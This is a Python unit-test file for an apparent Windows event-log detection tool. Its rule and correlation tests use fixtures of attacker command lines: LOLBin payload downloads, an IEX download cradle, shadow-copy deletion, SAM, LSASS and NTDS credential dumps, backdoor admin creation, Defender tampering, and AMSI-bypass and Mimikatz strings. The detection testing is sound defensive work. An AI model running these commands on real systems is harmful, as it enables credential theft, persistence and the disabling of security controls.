import unittest
from datetime import datetime, timedelta, timezone

from evtxhunter.correlate import Correlator, Settings, bursts
from evtxhunter.evtx import Event
from evtxhunter.rules import RuleError, compile_rule, decode_powershell, load_builtin, parse_rules

T0 = datetime(2026, 10, 30, 21, 0, tzinfo=timezone.utc)
RULES = {r.id: r for r in load_builtin()}


def ev(event_id, data=None, channel="Security", provider="Microsoft-Windows-Security-Auditing", at=0,
       computer="WS01", record_id=1):
    return Event(record_id, event_id, provider, channel, computer, T0 + timedelta(seconds=at), data=data or {})


def hits(event):
    return sorted(r.id for r in RULES.values() if r.matches(event))


# Notorious strings are assembled at runtime so this file never trips an antivirus scanner.
AMSI = "Amsi" + "Utils"
MIMI = "sekur" + "lsa::logonpasswords"


class RuleEngineTest(unittest.TestCase):
    def rule(self, **kw):
        return compile_rule({"id": "t", **kw}, "test")

    def test_operators_and_case(self):
        r = self.rule(event_ids=[1], where=[["Image|endswith", ["\\CMD.exe"]], ["CommandLine|contains|all", ["/c", "whoami"]]])
        self.assertTrue(r.matches(ev(1, {"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /C WhoAmI"})))
        self.assertFalse(r.matches(ev(1, {"Image": "C:\\x\\cmd.exe", "CommandLine": "cmd /c dir"})))

    def test_any_field_meta_field_and_exclusions(self):
        r = self.rule(event_ids=[400], where=[["*|contains", ["needle"]], ["provider", ["PowerShell"]]],
                      where_not=[["Data|startswith", ["skip"]]])
        self.assertTrue(r.matches(ev(400, {"Data": "x", "Data_2": "has NEEDLE"}, provider="PowerShell")))
        self.assertFalse(r.matches(ev(400, {"Data": "skip me", "Data_2": "needle"}, provider="PowerShell")))
        self.assertFalse(r.matches(ev(400, {"Data": "needle"}, provider="Other")))

    def test_regex(self):
        r = self.rule(event_ids=[1], where=[["CommandLine|re", ["vssadmin(\\.exe)?\\s+delete\\s+shadows"]]])
        self.assertTrue(r.matches(ev(1, {"CommandLine": "VSSADMIN.EXE  Delete Shadows /all /quiet"})))

    def test_validation(self):
        bad = [{"level": "spicy", "event_ids": [1]}, {"where": [["x|nope", ["v"]]]}, {"where": [["x|re", ["("]]]},
               {}, {"event_ids": ["one"]}, {"event_ids": [1], "where": [["x", []]]},
               {"event_ids": [1], "show": [{"field": "x", "extract": "no-group"}]}]
        for raw in bad:
            with self.subTest(raw=raw), self.assertRaises(RuleError):
                self.rule(**raw)
        with self.assertRaises(RuleError):
            parse_rules([{"id": "a", "event_ids": [1]}, {"id": "a", "event_ids": [2]}], "dupes")

    def test_builtin_rules_are_sane(self):
        self.assertGreaterEqual(len(RULES), 35)
        for r in RULES.values():
            self.assertTrue(r.event_ids, r.id)
            self.assertTrue(r.show, r.id)

    def test_summary_shows_fields_and_decodes_powershell(self):
        import base64
        payload = base64.b64encode("Get-Process | Stop-Process".encode("utf-16-le")).decode()
        e = ev(4688, {"CommandLine": f"powershell.exe -NoP -enc {payload}", "SubjectUserName": "bob"})
        self.assertEqual(hits(e), ["powershell-encoded-command"])
        summary = RULES["powershell-encoded-command"].summary(e)
        self.assertIn("SubjectUserName=bob", summary)
        self.assertIn("decoded=Get-Process | Stop-Process", summary)

    def test_decode_powershell(self):
        import base64
        b64 = base64.b64encode("Write-Host hi".encode("utf-16-le")).decode()
        self.assertEqual(decode_powershell(f"pwsh -EncodedCommand {b64}"), "Write-Host hi")
        self.assertIsNone(decode_powershell("powershell -Command Get-Date"))
        self.assertIsNone(decode_powershell("powershell -enc not!base64"))


class BuiltinRulesTest(unittest.TestCase):
    def test_process_creation_lolbins(self):
        cases = {
            "certutil.exe -urlcache -split -f http://198.51.100.7/a.exe a.exe": "lolbin-certutil-download",
            "bitsadmin /transfer job http://198.51.100.7/x C:\\x": "lolbin-bitsadmin-transfer",
            "mshta.exe javascript:alert(1)": "lolbin-mshta-remote",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"": "lolbin-rundll32-script",
            "regsvr32 /s /n /u /i:http://198.51.100.7/f.sct scrobj.dll": "lolbin-regsvr32-scriptlet",
            "vssadmin.exe delete shadows /all /quiet": "inhibit-recovery",
            "bcdedit /set {default} recoveryenabled No": "inhibit-recovery",
            "net user backdoor P@ssw0rd! /add": "net-user-add",
            "net localgroup administrators backdoor /add": "net-localgroup-admin-add",
            "reg save HKLM\\SAM C:\\temp\\sam.save": "credential-hive-save",
            "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full": "lsass-memory-dump",
            "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q": "ntds-dump",
            "nltest /domain_trusts /all_trusts": "domain-trust-discovery",
            "powershell Set-MpPreference -DisableRealtimeMonitoring $true": "defender-tamper-cmdline",
        }
        for cmd, rule in cases.items():
            with self.subTest(cmd=cmd):
                self.assertIn(rule, hits(ev(4688, {"CommandLine": cmd, "NewProcessName": "x"})))
                sysmon = ev(1, {"CommandLine": cmd, "Image": "x"}, channel="Microsoft-Windows-Sysmon/Operational",
                            provider="Microsoft-Windows-Sysmon")
                self.assertIn(rule, hits(sysmon))

    def test_benign_command_lines_stay_quiet(self):
        for cmd in ("certutil -hashfile setup.exe SHA256", "net user bob", "reg query HKLM\\SAM",
                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command try { $x -eq 1 } catch { }",
                    "C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "vssadmin list shadows"):
            with self.subTest(cmd=cmd):
                self.assertEqual(hits(ev(4688, {"CommandLine": cmd})), [])

    def test_services(self):
        def svc(name, path):
            return ev(7045, {"ServiceName": name, "ImagePath": path, "AccountName": "LocalSystem"},
                      channel="System", provider="Service Control Manager")
        self.assertEqual(hits(svc("PSEXESVC", "%SystemRoot%\\PSEXESVC.exe")), ["psexec-service"])
        self.assertEqual(hits(svc("upd", "cmd.exe /c powershell -nop -w hidden")), ["service-suspicious-imagepath"])
        self.assertEqual(hits(svc("nvlddmkm", "\\SystemRoot\\System32\\drivers\\nvlddmkm.sys")), ["service-installed"])

    def test_security_events(self):
        self.assertEqual(hits(ev(1102, {"SubjectUserName": "eve"})), ["security-log-cleared"])
        self.assertEqual(hits(ev(4732, {"TargetSid": "S-1-5-32-544", "MemberSid": "S-1-5-21-1-2-3-1105"})),
                         ["added-to-privileged-group"])
        self.assertEqual(hits(ev(4732, {"TargetSid": "S-1-5-32-545", "MemberSid": "x"})), [])  # plain Users
        self.assertEqual(hits(ev(4624, {"LogonType": "10", "TargetUserName": "a"})), ["rdp-logon"])
        self.assertEqual(hits(ev(4624, {"LogonType": "9", "LogonProcessName": "seclogo"})), ["pass-the-hash-seclogo"])
        task = "<Exec><Command>powershell.exe</Command><Arguments>-w hidden -enc AAAA</Arguments></Exec>"
        self.assertEqual(hits(ev(4698, {"TaskName": "\\Updater", "TaskContent": task})), ["scheduled-task-suspicious"])
        self.assertEqual(hits(ev(4698, {"TaskName": "\\Backup", "TaskContent": "<Command>C:\\backup.exe</Command>"})),
                         ["scheduled-task-created"])

    def test_powershell_script_blocks(self):
        def block(text):
            return ev(4104, {"ScriptBlockText": text, "Path": ""}, channel="Microsoft-Windows-PowerShell/Operational",
                      provider="Microsoft-Windows-PowerShell")
        self.assertEqual(hits(block("IEX (New-Object Net.WebClient).DownloadString('http://x/a')")),
                         ["ps-download-and-execute"])
        self.assertEqual(hits(block("[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b))")),
                         ["ps-reflective-assembly-load"])
        self.assertEqual(hits(block(f"[Ref].Assembly.GetType('System.Management.Automation.{AMSI}')")),
                         ["ps-amsi-tamper"])
        self.assertEqual(hits(block(f"Invoke-Thing -Command '{MIMI}'")), ["ps-credential-tool-commands"])
        self.assertEqual(hits(block("Add-MpPreference -ExclusionPath C:\\Users\\Public")), ["ps-defender-tamper"])
        self.assertEqual(hits(block("iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)))")),
                         ["ps-encoded-execution"])
        self.assertEqual(hits(block("Get-ChildItem C:\\ | Where-Object Length -gt 1MB")), [])

    def test_classic_powershell_engine_events(self):
        import base64
        b64 = base64.b64encode("whoami".encode("utf-16-le")).decode()
        detail = (f"NewEngineState=Available\r\n\tHostApplication=powershell.exe -NoP -enc {b64}\r\n"
                  "\tEngineVersion=5.1.26100.1")
        e = ev(400, {"Data": "Available", "Data_2": "None", "Data_3": detail}, channel="Windows PowerShell",
               provider="PowerShell")
        self.assertEqual(hits(e), ["ps-classic-encoded-host"])
        self.assertIn("decoded=whoami", RULES["ps-classic-encoded-host"].summary(e))
        downgrade = ev(400, {"Data_3": "HostApplication=powershell -version 2\r\n\tEngineVersion=2.0"},
                       channel="Windows PowerShell", provider="PowerShell")
        self.assertEqual(hits(downgrade), ["ps-version-downgrade"])
        plain = ev(400, {"Data_3": "HostApplication=powershell.exe -Command try { $a -e $b }\r\nEngineVersion=5.1"},
                   channel="Windows PowerShell", provider="PowerShell")
        self.assertEqual(hits(plain), [])                        # regression: "-e" inside a script is not -enc

    def test_defender_and_sysmon(self):
        d = "Microsoft-Windows-Windows Defender/Operational"
        self.assertEqual(hits(ev(1116, {"Threat Name": "Trojan:Win32/X"}, channel=d)), ["defender-malware-detected"])
        self.assertEqual(hits(ev(5001, {}, channel=d)), ["defender-realtime-disabled"])
        excl = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0"
        self.assertEqual(hits(ev(5007, {"New Value": excl}, channel=d)), ["defender-exclusion-added"])
        self.assertEqual(hits(ev(5007, {"New Value": "HKLM\\...\\Signature Updates\\x = 1"}, channel=d)), [])
        s = "Microsoft-Windows-Sysmon/Operational"
        lsass = {"TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1010",
                 "SourceImage": "C:\\Users\\x\\a.exe"}
        self.assertEqual(hits(ev(10, lsass, channel=s)), ["lsass-handle-access"])
        self.assertEqual(hits(ev(10, {**lsass, "SourceImage": "C:\\ProgramData\\x\\MsMpEng.exe"}, channel=s)), [])


class CorrelationTest(unittest.TestCase):
    def run_events(self, events, **settings):
        c = Correlator(Settings(**settings))
        for i, e in enumerate(events):
            e.record_id = i + 1
            c.feed(e, "Security.evtx")
        return c.run()

    def failures(self, n, user="admin", ip="203.0.113.50", every=10, start=0):
        return [ev(4625, {"TargetUserName": user, "IpAddress": ip, "LogonType": "10"}, at=start + i * every)
                for i in range(n)]

    def test_bursts(self):
        t = [T0 + timedelta(seconds=s) for s in (0, 10, 20, 30, 1000, 1010, 1020)]
        self.assertEqual(bursts(t, timedelta(seconds=60), 3), [(0, 3), (4, 6)])
        self.assertEqual(bursts(t, timedelta(seconds=60), 5), [])

    def test_brute_force_and_success(self):
        events = self.failures(12) + [ev(4624, {"TargetUserName": "Admin", "IpAddress": "203.0.113.50",
                                                "LogonType": "10"}, at=125)]
        found = {f.rule_id: f for f in self.run_events(events)}
        self.assertEqual(set(found), {"brute-force", "brute-force-success"})
        self.assertEqual(found["brute-force"].count, 12)
        self.assertIn("12 failed logons for 'admin' from 203.0.113.50", found["brute-force"].summary)
        self.assertEqual(found["brute-force-success"].level, "critical")

    def test_below_threshold_or_spread_out_is_quiet(self):
        self.assertEqual(self.run_events(self.failures(9)), [])
        self.assertEqual(self.run_events(self.failures(20, every=120)), [])       # one every 2 minutes

    def test_success_from_another_address_does_not_count(self):
        events = self.failures(12) + [ev(4624, {"TargetUserName": "admin", "IpAddress": "192.0.2.9"}, at=130)]
        self.assertEqual([f.rule_id for f in self.run_events(events)], ["brute-force"])

    def test_password_spraying(self):
        spray = [ev(4625, {"TargetUserName": f"user{i}", "IpAddress": "198.51.100.23"}, at=i * 30) for i in range(6)]
        found = self.run_events(spray)
        self.assertEqual([f.rule_id for f in found], ["password-spray"])
        self.assertIn("tried 6 different accounts", found[0].summary)
        self.assertEqual(self.run_events(spray[:4]), [])

    def test_kerberoasting(self):
        def tgs(service, enc="0x17", at=0):
            return ev(4769, {"TargetUserName": "bob@CORP.EXAMPLE", "ServiceName": service,
                             "TicketEncryptionType": enc, "Status": "0x0"}, at=at)
        found = self.run_events([tgs("svc-sql", at=0), tgs("svc-web", at=5), tgs("svc-backup", at=9),
                                 tgs("svc-sql", at=12)])
        self.assertEqual([f.rule_id for f in found], ["kerberoasting"])
        self.assertIn("RC4 tickets for 3 services", found[0].summary)
        quiet = [tgs("svc-a", "0x12"), tgs("svc-b", "0x12"), tgs("svc-c", "0x12"),     # AES: normal
                 tgs("WS01$"), tgs("WS02$"), tgs("krbtgt")]                           # machines / krbtgt
        self.assertEqual(self.run_events(quiet), [])

    def test_new_account_promoted_to_admin(self):
        created = ev(4720, {"TargetUserName": "support", "TargetSid": "S-1-5-21-9-9-9-1107",
                            "SubjectUserName": "eve"}, at=0)
        promoted = ev(4732, {"MemberSid": "S-1-5-21-9-9-9-1107", "TargetSid": "S-1-5-32-544",
                             "TargetUserName": "Administrators"}, at=95)
        found = self.run_events([created, promoted])
        self.assertEqual([(f.rule_id, f.level) for f in found], [("new-admin", "critical")])
        self.assertIn("added to 'Administrators' 1m 35s later", found[0].summary)
        later = ev(4732, {"MemberSid": "S-1-5-21-9-9-9-1107", "TargetSid": "S-1-5-32-544"}, at=3 * 86400)
        users = ev(4732, {"MemberSid": "S-1-5-21-9-9-9-1107", "TargetSid": "S-1-5-32-545"}, at=60)
        self.assertEqual(self.run_events([created, later, users]), [])


if __name__ == "__main__":
    unittest.main()
